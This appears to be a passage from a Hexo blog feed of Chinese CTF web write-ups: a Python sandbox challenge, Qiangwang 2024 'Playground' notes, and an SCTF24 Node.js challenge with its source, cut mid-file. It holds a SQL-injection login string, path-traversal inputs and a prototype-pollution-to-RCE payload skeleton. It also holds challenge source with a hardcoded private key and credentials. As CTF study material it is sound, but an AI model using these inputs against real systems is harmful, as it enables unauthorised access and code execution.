class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><h3 id="关于字符串"><a href="#关于字符串" class="headerlink" title="*关于字符串"></a>*关于字符串</h3><ol><li><em><strong>加深了我对字符串编码的理解</strong></em><ol><li>你在本地<strong>通过python</strong>发出去的\n和\r还有\u编码这些都会直接解释为对应的字符，在发出去的字符串中根本不会有\这个字符，不需要进行绕过</li><li>但是如果<strong>是在bp</strong>中的话，那么对方接受到的就是有带\的</li><li><strong>最大大的区别在于</strong>: 是否在发出去时有进行替换，记住的是python有</li></ol></li></ol><h3 id="绕过点1-unidecode-unidecode"><a href="#绕过点1-unidecode-unidecode" class="headerlink" title="绕过点1: unidecode.unidecode"></a>绕过点1: unidecode.unidecode</h3><blockquote><p>脚本技巧，见同名unidecode</p></blockquote><h3 id="绕过点2-ast-Import和ast-ImportFrom"><a href="#绕过点2-ast-Import和ast-ImportFrom" class="headerlink" title="绕过点2: ast.Import和ast.ImportFrom"></a>绕过点2: ast.Import和ast.ImportFrom</h3><blockquote><p>多多ai并查就好了</p></blockquote><ol><li>Import 语句：<ol><li>Import 节点表示一个 import 语句，用于导入整个模块或多个模块。</li><li>例如：import os 或 import sys, os。</li></ol></li><li>ImportFrom 语句：<ol><li>ImportFrom 节点表示一个 from … import 语句，用于从模块中导入特定的名称。</li><li>例如：from os import path 或 from sys import version as ver’</li></ol></li></ol><h3 id="绕过点3-suid提权"><a href="#绕过点3-suid提权" class="headerlink" title="绕过点3: suid提权"></a>绕过点3: suid提权</h3><blockquote><p>详见文章Linux提权，这里不做原理介绍</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> python </tag>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Playground_强网24</title>
      <link href="/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>Flask沙盒逃逸？</li><li>&#x2F;entrypoint.sh<ol><li>环境变量读flag，不行，这里是docker不同 checked</li><li>root读flag，权限问题 -&gt; 沙盒的运行环境是一个在本地2077端口的服务</li></ol></li><li>权限问题看看dockerfile<ol><li>&#x2F;tmp&#x2F;go 777</li><li>&#x2F;app 700 仅所有者可读、写、执行</li><li>&#x2F;sandbox 755 所有者可读、写、执行，其他用户可读、执行</li><li>&#x2F;flag 400 仅所有者可读，这是什么情况 -&gt; 问题不大后面再来，ps aux再来看看绕过即可，这个就涉及到提权问题了</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SycServer2_SCTF24</title>
      <link href="/2024/11/01/SycServer2_SCTF24/"/>
      <url>/2024/11/01/SycServer2_SCTF24/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-Failed"><a href="#分析与尝试-Failed" class="headerlink" title="分析与尝试(Failed)"></a>分析与尝试(Failed)</h2><ol><li><p>右键查看源码发现有个sql的waf，在前端可以控制台直接覆盖掉&#x2F;修改(这里不是禁用)</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wafsql = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>都到这个点了那就sql注入，admin和1’or ‘1’&#x3D;’1 –&gt; &#x2F;robots.txt文件中的路由需要登录后访问</p></li><li><p>&#x2F;robots.txt下有信息，考虑存在目录遍历回显文件内容，<code>?v=.&amp;f=app.js</code>或者<code>?v=....//....//....//....//app&amp;f=/app.js</code>(说实话应该没必要吧)</p></li><li><p><em><strong>可以读源码</strong></em>，读出来不可读，cyberchef发发力，ok，有app.js，可知express框架，可按找架构获取一些信息(也可从app.js出发)，都放在源码处了，这里可以的话**dirsearch发发力(docker的话一般可以)**，当然要试试&#x2F;flag了，不过没什么55</p><ol><li>package.json读读看，环境相关，还是要有意识</li><li><code>const handle = require(&#39;./handle&#39;);</code>引入但是没有用，读文件也不行，猜测为文件夹，进行读取<code>handle/index.js</code></li><li>index.js内容指向，读<code>handle/child_process.js</code></li><li><code>/static/report_noway_dirsearch.html</code>是从app.js中读出来的</li></ol></li><li><p>发现一个风险函数和原型链污染</p><ol><li>有原型链污染</li><li>但是没人调用啊，输入源是command也写定了，难搞，看看别的文件</li><li>哟西，<code>/child_processes</code>会是切入口，我理理，argv0覆盖？要的话得在prototypelessObj添加属性argv0，前面不是有个原型链覆盖吗  –&gt; sad，这一步没去想查一直钻(<strong>env也是一个思路但是被我忽视了</strong>)，<strong>不会还是多查查资料</strong>，这里是属于原型链污染命令执行的内容，可以看看<strong>payload中有无形似的再了解原理</strong></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><blockquote><p>pp2rce原理部分见同名文章，但是看完还是没看懂题解啊55，欸欸欸，有点思路了<br><a href="https://xz.aliyun.com/t/15782?time__1311=GqjxnQGQDQExl6zG7DyDIOOQGCYyh3+x3x&u_atoken=e4ab7359fc825c21b8d183b69afdd937&u_asig=0a47315217305328929498942e013f#toc-4">这篇文章看思路就好了</a>，和我最后顿悟的分析一致</p></blockquote><ol><li>再次回看，直接按照spawn的输入进行思考(<strong>有个参照好很多</strong>)，注意apply里的arg包括了command，分析可知会进入<code>pos&lt;args.length</code>环节，可知pos会++，变成2</li><li>这里ai一下可以知道，如果传入的是空的比如<code>prototypelessSpawnOpts()</code>再加上后买你<code>Object.create()</code>和<code>Object.assign()</code>原型链污染被过滤的死死的，要污染到env传入的obj中env有内容，也就是需要从<code>if(hasArgs...)</code>这个if条件中进入，此时的传入为<code>args[2]</code></li><li>综上，需要args[2]是一个对象，结合原型链污染漏洞，构造1如下，后续就考虑经典的pp2rce问题即可</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;__proto__&quot;</span></span><br><span class="line">  <span class="string">&quot;date&quot;</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="comment">// 以下对象值会是传入spawn()中options的内容</span></span><br><span class="line">  <span class="string">&quot;reportmessage&quot;</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="string">&quot;env&quot;</span>:  <span class="comment">//... </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终payload2</span></span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><ol><li>node proxy 见 Nodejs安全</li><li>pp2rce见同名文章</li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nodeRsa = <span class="built_in">require</span>(<span class="string">&#x27;node-rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> handle = <span class="built_in">require</span>(<span class="string">&#x27;./handle&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> con = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;ctf123123&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&#x27;sctf&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">con.<span class="title function_">connect</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(con.<span class="title function_">connect</span>(), <span class="number">2000</span>); <span class="comment">// 2秒后重试连接</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected to MySQL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;response&#125; = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> req = <span class="built_in">require</span>(<span class="string">&quot;express/lib/request&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(&#123; <span class="attr">b</span>: <span class="number">1024</span> &#125;);</span><br><span class="line">key.<span class="title function_">setOptions</span>(&#123; <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicPem = -----<span class="variable constant_">BEGIN</span> <span class="variable constant_">PUBLIC</span> <span class="variable constant_">KEY</span>-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B<span class="comment">//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----;</span></span><br><span class="line"><span class="keyword">var</span> privatePem = <span class="string">`-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span></span><br><span class="line"><span class="string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span></span><br><span class="line"><span class="string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span></span><br><span class="line"><span class="string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span></span><br><span class="line"><span class="string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span></span><br><span class="line"><span class="string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span></span><br><span class="line"><span class="string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span></span><br><span class="line"><span class="string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span></span><br><span class="line"><span class="string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span></span><br><span class="line"><span class="string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span></span><br><span class="line"><span class="string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span></span><br><span class="line"><span class="string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span></span><br><span class="line"><span class="string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span></span><br><span class="line"><span class="string">xu/vfQ0A1jHRNC7t</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Reportcache</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyAdmin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;No token provided&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">SECRET_KEY</span>, <span class="function">(<span class="params">err, decoded</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Failed to authenticate token&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span> = decoded;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">publicKey</span>: publicPem,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> pem = privatePem;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(pem, &#123;</span><br><span class="line">      <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span>,</span><br><span class="line">      <span class="attr">b</span>: <span class="number">1024</span></span><br><span class="line">    &#125;);</span><br><span class="line">    key.<span class="title function_">setOptions</span>(&#123; <span class="attr">environment</span>: <span class="string">&quot;browser&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> key.<span class="title function_">decrypt</span>(body, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;decrypt error&quot;</span>, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> encryptedPassword = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    passwd = <span class="title function_">decrypt</span>(encryptedPassword)</span><br><span class="line">    <span class="keyword">if</span>(username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> sql = <span class="title function_">select</span> (select password <span class="keyword">from</span> user where username = <span class="string">&#x27;admin&#x27;</span>) = <span class="string">&#x27;$&#123;passwd&#125;&#x27;</span>;</span><br><span class="line">      con.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(err.<span class="property">message</span>);</span><br><span class="line">        <span class="keyword">if</span> (rows[<span class="number">0</span>][<span class="title class_">Object</span>.<span class="title function_">keys</span>(rows[<span class="number">0</span>])]) &#123;</span><br><span class="line">          <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;username, <span class="attr">role</span>: username&#125;, <span class="variable constant_">SECRET_KEY</span>, &#123;<span class="attr">expiresIn</span>: <span class="string">&#x27;1h&#x27;</span>&#125;);</span><br><span class="line">          res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span 